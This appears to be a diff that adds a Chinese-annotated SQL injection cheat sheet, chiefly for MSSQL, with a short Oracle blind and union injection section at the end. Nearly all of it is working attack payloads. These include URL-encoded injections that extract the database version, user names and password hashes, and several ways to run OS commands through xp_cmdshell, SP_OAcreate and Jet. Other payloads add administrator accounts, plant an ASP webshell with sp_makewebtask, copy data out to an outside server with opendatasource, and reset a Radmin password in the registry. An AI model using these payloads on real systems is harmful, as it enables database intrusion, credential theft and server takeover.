@@ -1,0 +1,245 @@
+//看看是什么权限的
+and 1=(Select IS_MEMBER('db_owner'))
+And char(124)%2BCast(IS_MEMBER('db_owner') as varchar(1))%2Bchar(124)=1 ;--
+
+//检测是否有读取某数据库的权限
+and 1= (Select HAS_DBACCESS('master'))
+And char(124)%2BCast(HAS_DBACCESS('master') as varchar(1))%2Bchar(124)=1 --
+
+
+数字类型
+and char(124)%2Buser%2Bchar(124)=0
+
+字符类型
+' and char(124)%2Buser%2Bchar(124)=0 and ''='
+
+搜索类型
+' and char(124)%2Buser%2Bchar(124)=0 and '%'='
+
+爆用户名
+ and user>0
+' and user>0 and ''='
+
+检测是否为SA权限
+and 1=(select IS_SRVROLEMEMBER('sysadmin'));--
+And char(124)%2BCast(IS_SRVROLEMEMBER(0x730079007300610064006D0069006E00) as varchar(1))%2Bchar(124)=1 --
+
+检测是不是MSSQL数据库
+and exists (select * from sysobjects);-- 
+
+检测是否支持多行
+;declare @d int;-- 
+
+恢复 xp_cmdshell
+;exec master..dbo.sp_addextendedproc 'xp_cmdshell','xplog70.dll';--
+
+
+select * from openrowset('sqloledb','server=192.168.1.200,1433;uid=test;pwd=pafpaf','select @@version') 
+
+//-----------------------
+//      执行命令
+//-----------------------
+首先开启沙盘模式：
+exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
+
+然后利用jet.oledb执行系统命令
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\winnt\system32\ias\ias.mdb','select shell("cmd.exe /c net user admin admin1234 /add")')
+
+执行命令
+;DECLARE @shell INT EXEC SP_OAcreate 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD @shell,'run',null, 'C:\WINNT\system32\cmd.exe /c net user paf pafpaf /add';--
+
+EXEC [master].[dbo].[xp_cmdshell] 'cmd /c md c:\1111'
+
+判断xp_cmdshell扩展存储过程是否存在：
+http://192.168.1.5/display.asp?keyno=188 and 1=(Select count(*) FROM master.dbo.sysobjects Where xtype = 'X' AND name = 'xp_cmdshell')
+
+写注册表
+exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
+
+REG_SZ
+
+读注册表
+exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon','Userinit'
+
+读取目录内容
+exec master..xp_dirtree 'c:\winnt\system32\',1,1
+
+
+数据库备份
+backup database pubs to disk = 'c:\123.bak'
+
+//爆出长度
+And (Select char(124)%2BCast(Count(1) as varchar(8000))%2Bchar(124) From D99_Tmp)=0 ;--
+
+
+
+更改sa口令方法：用sql综合利用工具连接后，执行命令：
+exec sp_password NULL,'新密码','sa'
+
+添加和删除一个SA权限的用户test：
+exec master.dbo.sp_addlogin test,ptlove
+exec master.dbo.sp_addsrvrolemember test,sysadmin
+
+删除扩展存储过过程xp_cmdshell的语句: 
+exec sp_dropextendedproc 'xp_cmdshell'
+
+添加扩展存储过过程
+EXEC [master]..sp_addextendedproc 'xp_proxiedadata', 'c:\winnt\system32\sqllog.dll' 
+GRANT exec On xp_proxiedadata TO public 
+
+
+停掉或激活某个服务。 
+
+exec master..xp_servicecontrol 'stop','schedule'
+exec master..xp_servicecontrol 'start','schedule'
+
+dbo.xp_subdirs
+
+只列某个目录下的子目录。
+xp_getfiledetails 'C:\Inetpub\wwwroot\SQLInject\login.asp'
+
+dbo.xp_makecab
+
+将目标多个档案压缩到某个目标档案之内。
+所有要压缩的档案都可以接在参数列的最后方，以逗号隔开。
+
+dbo.xp_makecab
+'c:\test.cab','mszip',1,
+'C:\Inetpub\wwwroot\SQLInject\login.asp',
+'C:\Inetpub\wwwroot\SQLInject\securelogin.asp'
+
+xp_terminate_process
+
+停掉某个执行中的程序，但赋予的参数是 Process ID。
+利用”工作管理员”，透过选单「检视」-「选择字段」勾选 pid，就可以看到每个执行程序的 Process ID
+
+xp_terminate_process 2484
+
+xp_unpackcab
+
+解开压缩档。
+
+xp_unpackcab 'c:\test.cab','c:\temp',1
+
+
+某机，安装了radmin，密码被修改了，regedit.exe不知道被删除了还是被改名了，net.exe不存在，没有办法使用regedit /e 导入注册文件，但是mssql是sa权限，使用如下命令 EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SYSTEM\RAdmin\v2.0\Server\Parameters','Parameter','REG_BINARY',0x02ba5e187e2589be6f80da0046aa7e3c 即可修改密码为12345678。如果要修改端口值 EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SYSTEM\RAdmin\v2.0\Server\Parameters','port','REG_BINARY',0xd20400 则端口值改为1234
+
+create database lcx;
+Create TABLE ku(name nvarchar(256) null);
+Create TABLE biao(id int NULL,name nvarchar(256) null);
+
+//得到数据库名
+insert into opendatasource('sqloledb','server=211.39.145.163,1443;uid=test;pwd=pafpaf;database=lcx').lcx.dbo.ku select name from master.dbo.sysdatabases
+
+
+//在Master中创建表，看看权限怎样
+Create TABLE master..D_TEST(id nvarchar(4000) NULL,Data nvarchar(4000) NULL);--
+
+用 sp_makewebtask直接在web目录里写入一句话马：
+http://127.0.0.1/dblogin123.asp?username=123';exec%20sp_makewebtask%20'd:\www\tt\88.asp','%20select%20''<%25execute(request("a"))%25>''%20';--
+
+//更新表内容
+Update films SET kind = 'Dramatic' Where id = 123
+
+//删除内容
+delete from table_name where Stockid = 3
+
+MSSQL
+
+newmess.asp?id=70' ;
+
+drop table pangolin_test_table;
+create table pangolin_test_table([id] [int] identity (1,1) not null,[name] [nvarchar] (300) not null,[depth] [int] not null,[isfile] [nvarchar] (50) null);--
+
+declare @z nvarchar(4000) set @z=0x65003a005c00 insert pangolin_test_table execute master..xp_dirtree @z,1,1--
+
+and 1=2 union all select char(94)+char(94)+char(94)+cast(cast(count(1) as varchar(8000)) as nvarchar(4000))+char(94)+char(94)+char(94),null,null from pangolin_test_table--
+
+and 1=2 union all select char(94)+char(94)+char(94)+cast(cast([isfile] as nvarchar(4000))+char(94)+cast([name] as nvarchar(4000)) as nvarchar(4000))+char(94)+char(94)+char(94),null,null from (select top 1 * from (select top 替换值 [name],[isfile] from pangolin_test_table group by [name],[isfile] order by [isfile]) t order by [isfile] desc,[name] desc) t----
+替换值从1开始，123456……
+
+查version
+newmess.asp?id=70' and 1=2 union all select char(94)+char(94)+char(94)+cast(@@version as nvarchar(4000))+char(94)+char(94)+char(94),null,null --
+char(94)转换后是^
+
+查DB name
+newmess.asp?id=70' and 1=2 union all select char(94)+char(94)+char(94)+cast(db_name() as nvarchar(4000))+char(94)+char(94)+char(94),null,null --
+
+查Server name
+newmess.asp?id=70' and 1=2 union all select char(94)+char(94)+char(94)+cast(@@servername as nvarchar(4000))+char(94)+char(94)+char(94),null,null --
+
+查Host name
+newmess.asp?id=70' and 1=2 union all select char(94)+char(94)+char(94)+cast(and host_name()=0-- as nvarchar(4000))+char(94)+char(94)+char(94),null,null --
+
+查system user
+newmess.asp?id=70' and 1=2 union all select char(94)+char(94)+char(94)+cast(system_user as nvarchar(4000))+char(94)+char(94)+char(94),null,null --
+
+查current user
+newmess.asp?id=70' and 1=2 union all select char(94)+char(94)+char(94)+cast(user as nvarchar(4000))+char(94)+char(94)+char(94),null,null --
+
+查privilege
+newmess.asp?id=70' and 1=2 union all select char(94)+char(94)+char(94)+cast(is_srvrolemember(0x730079007300610064006d0069006e00) as nvarchar(4000))+char(94)+char(94)+char(94),null,null --
+
+查Databases
+newmess.asp?id=70' and 1=2 union all select top 1 char(94)+char(94)+char(94)+cast(cast([name] as nvarchar(4000))+char(94)+cast([filename] as nvarchar(4000)) as nvarchar(4000))+char(94)+char(94)+char(94),null,null from (select top 1 dbid,name,filename from (select top 替换值 dbid,name,filename from [master].[dbo].[sysdatabases] order by 1) t order by 1 desc)t--
+替换值从1开始，123456……
+
+查Drivers
+newmess.asp?id=70' ;drop table pangolin_test_table;--
+
+newmess.asp?id=70' ;create table pangolin_test_table(name nvarchar(255),low nvarchar(255),high nvarchar(255),type nvarchar(255));--
+
+newmess.asp?id=70' ;insert pangolin_test_table exec master.dbo.xp_availablemedia;--
+
+newmess.asp?id=70' and 1=2 union all select top 1 char(94)+char(94)+char(94)+cast(cast([name] as nvarchar(4000))+char(94)+cast([type] as nvarchar(4000)) as nvarchar(4000))+char(94)+char(94)+char(94),null,null from (select top 1 * from (select top 替换值 [name],[low],[high],[type] from pangolin_test_table group by [name],[low],[high],[type] order by [name]) t order by [name] desc)t-- 
+替换值从1开始，123456……
+
+newmess.asp?id=70' ;drop table pangolin_test_table;--
+
+查Localgroupus
+newmess.asp?id=70' ;drop table pangolin_test_table;--
+
+newmess.asp?id=70' ;create table pangolin_test_table(name nvarchar(255),description nvarchar(4000));--
+
+newmess.asp?id=70' ;insert pangolin_test_table exec master.dbo.xp_enumgroups;--
+
+newmess.asp?id=70' and 1=2 union all select top 1 char(94)+char(94)+char(94)+cast(cast([name] as nvarchar(4000))+char(94)+cast([description] as nvarchar(4000)) as nvarchar(4000))+char(94)+char(94)+char(94),null,null from (select top 1 * from (select top 1 [name],[description] from pangolin_test_table group by [name],[description] order by [name]) t order by [name] desc)t--
+
+newmess.asp?id=70' and 1=2 union all select top 1 char(94)+char(94)+char(94)+cast(cast([name] as nvarchar(4000))+char(94)+cast([description] as nvarchar(4000)) as nvarchar(4000))+char(94)+char(94)+char(94),null,null from (select top 1 * from (select top 替换值 [name],[description] from pangolin_test_table group by [name],[description] order by [name]) t order by [name] desc)t--
+替换值从1开始，123456……
+
+newmess.asp?id=70' ;drop table pangolin_test_table;--
+
+
+查users
+newmess.asp?id=70' and 1=2 union all select top 1 char(94)+char(94)+char(94)+cast(cast([name] as nvarchar(4000))+char(94)+isnull(master.dbo.fn_varbintohexstr([password]),char(32)) as nvarchar(4000))+char(94)+char(94)+char(94),null,null from (select top 1 * from (select top 1 [name],[password] from master..sysxlogins where xstatus!=192 order by [name]) t order by [name] desc)t--
+
+
+获取表
+newmess.asp?id=70' and 1=2 union all select char(94)+char(94)+char(94)+cast(cast(count(1) as varchar(10)) as nvarchar(4000))+char(94)+char(94)+char(94),null,null from [metc]..[sysobjects] where xtype=char(85) and status%3E0--
+%3E是>号
+
+
+执行命令
+newmess.asp?id=70' ;create table [pangolin_test_table]([resulttxt] nvarchar(4000) null);--
+
+newmess.asp?id=70' ;declare @z nvarchar(4000) set @z=0x640069007200200063003a005c00 insert into [pangolin_test_table](resulttxt) exec master.dbo.xp_cmdshell @z;alter table [pangolin_test_table] add id int not null identity (1,1)--
+
+newmess.asp?id=70' and 1=2 union all select char(94)+char(94)+char(94)+cast(count(1) as nvarchar(4000))+char(94)+char(94)+char(94),null,null from [metc]..[pangolin_test_table]--
+
+newmess.asp?id=70' ;drop table [pangolin_test_table];--
+
+Oracle
+
+盲注猜解
+
+/new/new_content.jsp?dtxx_id=881 and (select ascii(substr(table_name,6,1)) from (select rownum r,table_name from (select rownum r,table_name from user_tables where rownum%3C=1 order by 1 desc) t where r%3E1-1 order by 1)t)>0 and 1=1 HTTP/1.1
+
+
+用union依次爆出所有的表
+
+and 1=3 union select table_name from (select rownum r,table_name from (select rownum r,table_name from user_tables where rownum<=1 order by 1 desc) t where r>0 order by 1)t --
+
+and 1=3 union select table_name from (select rownum r,table_name from (select rownum r,table_name from user_tables where rownum<=2 order by 1 desc) t where r>1 order by 1)t --
+
+and 1=3 union select table_name from (select rownum r,table_name from (select rownum r,table_name from user_tables where rownum<=3 order by 1 desc) t where r>2 order by 1)t --
